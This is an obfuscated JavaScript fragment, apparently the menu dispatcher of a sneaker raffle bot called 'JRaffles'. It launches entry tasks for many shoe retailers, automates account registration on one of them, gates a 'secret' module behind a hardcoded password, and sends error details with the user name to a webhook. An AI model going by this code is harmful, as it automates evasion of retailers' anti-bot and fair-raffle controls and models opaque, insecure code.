                            var _0xf0bd4a = await _0x15a781(), _0x273f80 = await _0x294f5d(_0x1645c8);
                            _0x395552['shuffleTasks'] && await _0x204c5b(_0x273f80), await _0x1645c8['function'](_0x1645c8, _0x273f80, _0xf0bd4a);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0xf0bd4a = await _0x15a781(), _0x273f80 = await _0x294f5d(_0x1645c8);
                                _0x395552['shuffleTasks'] && await _0x204c5b(_0x273f80), await _0x1645c8['function'](_0x1645c8, _0x273f80, _0xf0bd4a);
                            }
                        }
                    } catch (_0x6c3891) {
                        console['log'](_0x6c3891), await _0x17175c(0xfa0);
                    }
                    return _0x2087d3();
                }
                if (_0x469829[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                        var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0xf0bd4a = await _0x15a781(), _0x273f80 = await _0x294f5d(_0x1645c8);
                            _0x395552['shuffleTasks'] && await _0x204c5b(_0x273f80), await _0x1645c8['function'](_0x1645c8, _0x273f80, _0xf0bd4a);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0xf0bd4a = await _0x15a781(), _0x273f80 = await _0x294f5d(_0x1645c8);
                                _0x395552['shuffleTasks'] && await _0x204c5b(_0x273f80), await _0x1645c8['function'](_0x1645c8, _0x273f80, _0xf0bd4a);
                            }
                        }
                    } catch (_0x596029) {
                        console['log'](_0x596029), await _0x17175c(0xfa0);
                    }
                    return _0x2087d3();
                }
                if (_0x469829[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                    var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0xf0bd4a = await _0x15a781();
                        return await _0x1645c8['function'](_0x1645c8, _0xf0bd4a), _0x2087d3();
                    }
                    var _0xf0bd4a = await _0x15a781(), _0x5e3bf8 = await _0x294f5d(_0x1645c8);
                    return _0x395552['shuffleTasks'] && await _0x204c5b(_0x5e3bf8), await _0x1645c8['function'](_0x1645c8, _0x5e3bf8, _0xf0bd4a), _0x2087d3();
                }
                if (_0x469829[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                    var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0xf0bd4a = await _0x15a781(), _0x5e3bf8 = await _0x294f5d(_0x1645c8);
                    return _0x395552['shuffleTasks'] && await _0x204c5b(_0x5e3bf8), await _0x1645c8['function'](_0x1645c8, _0x5e3bf8, _0xf0bd4a), _0x2087d3();
                }
                if (_0x469829[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                    var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0xf0bd4a = await _0x15a781(), _0x5e3bf8 = await _0x294f5d(_0x1645c8);
                    return _0x395552['shuffleTasks'] && await _0x204c5b(_0x5e3bf8), await _0x1645c8['function'](_0x1645c8, _0x5e3bf8, _0xf0bd4a), _0x2087d3();
                }
                if (_0x469829[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                    var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0xf0bd4a = await _0x15a781(), _0x5e3bf8 = await _0x294f5d(_0x1645c8);
                    return _0x395552['shuffleTasks'] && await _0x204c5b(_0x5e3bf8), await _0x1645c8['function'](_0x1645c8, _0x5e3bf8, _0xf0bd4a), _0x2087d3();
                } else {
                    if (_0x469829[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                        var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0xf0bd4a = await _0x15a781(), _0xdd782c = await _0x294f5d(_0x1645c8);
                            return _0x395552['shuffleTasks'] && await _0x204c5b(_0xdd782c), await _0x1645c8['function'](_0x1645c8, _0xdd782c, _0xf0bd4a), _0x2087d3();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0xf0bd4a = await _0x15a781();
                                return await _0x1645c8['function'](_0x1645c8, null, _0xf0bd4a), _0x2087d3();
                            }
                        }
                        ;
                    } else {
                        if (_0x469829[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                            var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction], _0xf0bd4a = await _0x15a781(), _0x303a2a = await _0x294f5d(_0x1645c8);
                            return _0x395552['shuffleTasks'] && await _0x204c5b(_0x303a2a), await _0x1645c8['function'](_0x1645c8, _0x303a2a, _0xf0bd4a), await _0x17175c(0x1388), _0x2087d3();
                        } else {
                            if (_0x469829[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                                var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0xf0bd4a = await _0x15a781(), _0xdd782c = await _0x294f5d(_0x1645c8);
                                    return _0x395552['shuffleTasks'] && await _0x204c5b(_0xdd782c), await _0x1645c8['function'](_0x1645c8, _0xdd782c, _0xf0bd4a), _0x2087d3();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0xf0bd4a = await _0x15a781();
                                        return await _0x1645c8['function'](_0x1645c8, null, _0xf0bd4a), _0x2087d3();
                                    }
                                }
                                ;
                            } else {
                                if (_0x469829[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                                    var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x1645c8);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x469829[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                                        var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0xf0bd4a = await _0x15a781(), _0x5e92a1 = await _0x294f5d(_0x1645c8);
                                            return _0x395552['shuffleTasks'] && await _0x204c5b(_0x5e92a1), await _0x1645c8['function'](_0x1645c8, _0x5e92a1, _0xf0bd4a), _0x2087d3();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0xf0bd4a = await _0x15a781(), _0x5e92a1 = await _0x294f5d(_0x1645c8);
                                                return _0x395552['shuffleTasks'] && await _0x204c5b(_0x5e92a1), await _0x1645c8['function'](_0x1645c8, _0x5e92a1, _0xf0bd4a), _0x2087d3();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x469829[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                                            var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0xf0bd4a = await _0x15a781(), _0x266c2f = await _0x294f5d(_0x1645c8);
                                                return _0x395552['shuffleTasks'] && await _0x204c5b(_0x266c2f), await _0x1645c8['function'](_0x1645c8, _0x266c2f, _0xf0bd4a), _0x2087d3();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0xf0bd4a = await _0x15a781(), _0x266c2f = await _0x294f5d(_0x1645c8);
                                                    return _0x395552['shuffleTasks'] && await _0x204c5b(_0x266c2f), await _0x1645c8['function'](_0x1645c8, _0x266c2f, _0xf0bd4a), _0x2087d3();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x469829[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                                                var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0xf0bd4a = await _0x15a781(), _0x2c05ec = await _0x294f5d(_0x1645c8);
                                                    return _0x395552['shuffleTasks'] && await _0x204c5b(_0x2c05ec), await _0x1645c8['function'](_0x1645c8, _0x2c05ec, _0xf0bd4a), _0x2087d3();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0xf0bd4a = await _0x15a781(), _0x2c05ec = await _0x294f5d(_0x1645c8);
                                                        return _0x395552['shuffleTasks'] && await _0x204c5b(_0x2c05ec), await _0x1645c8['function'](_0x1645c8, _0x2c05ec, _0xf0bd4a), _0x2087d3();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x469829[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                                                    var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0xf0bd4a = await _0x15a781(), _0x30fcfa = await _0x294f5d(_0x1645c8);
                                                        return _0x395552['shuffleTasks'] && await _0x204c5b(_0x30fcfa), await _0x1645c8['function'](_0x1645c8, _0x30fcfa, _0xf0bd4a), _0x2087d3();
                                                    }
                                                } else {
                                                    if (_0x469829[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x17175c(0x3e8), _0x2087d3();
                                                    else {
                                                        if (_0x469829[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x4b9ba2 = _0x469829[taskModule]['name'], _0xf0bd4a = await _0x15a781();
                                                            return await _0x1c50ad(_0x4b9ba2, _0xf0bd4a), _0x2087d3();
                                                        } else {
                                                            if (_0x469829[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x1c3994(_0x469829[taskModule]['modules']);
                                                                var _0x1645c8 = _0x469829[taskModule]['modules'][taskFunction];
                                                                return await _0x1645c8['function'](_0x1645c8), _0x2087d3();
                                                            } else {
                                                                if (_0x469829[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0xecdd51 = 0x0;
                                                                    for (const _0x568bcc in _0x395552) {
                                                                        console['log']('(' + _0xecdd51 + ')\x20' + _0x568bcc + '\x20:\x20' + _0x395552[_0x568bcc]), _0xecdd51++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0xecdd51 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x45f363 = await _0x38be69();
                                                                    if (_0x45f363 == _0xecdd51)
                                                                        return _0x2087d3();
                                                                    console['clear'];
                                                                    var _0x4f12bd = 0x0;
                                                                    for (var _0x46aad9 in _0x395552) {
                                                                        if (_0x45f363 == _0x4f12bd) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x46aad9 + '\x20:'), _0x395552[_0x46aad9] = await _0x54d055(), _0x2e1301['writeFileSync']('../settings.json', JSON['stringify'](_0x395552));
                                                                            break;
                                                                        } else
                                                                            _0x4f12bd++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x17175c(0xbb8), _0x2087d3();
                                                                } else {
                                                                    if (_0x469829[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x4c322(), _0x2087d3();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x469829[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x30b6c7 = await _0x582970();
                                                                            _0x30b6c7 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x3c91f4(), await afewFunction(_0x9f339f[_0x2cbc4a], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x17175c(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x2087d3();
            } catch (_0x19274) {
                return console['log'](_0x19274), _0x2087d3();
            }
        } catch (_0x331e7d) {
            return console['log'](_0x331e7d), await _0x17175c(0x3a98);
        }
}
;
_0xe0def5('JRaffles\x20' + _0x5e7c75), _0x4c322();
try {
    _0x796d82();
} catch (_0x10c94f) {
    var _0x301e7e = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x25f505
            },
            {
                'name': 'Version',
                'value': '' + _0x5e7c75
            },
            {
                'name': 'Error',
                'value': '' + _0x10c94f
            }
        ]
    }];
    const _0x46a449 = { 'embeds': _0x301e7e };
    _0x17b782(_0x40c5c7, _0x46a449);
}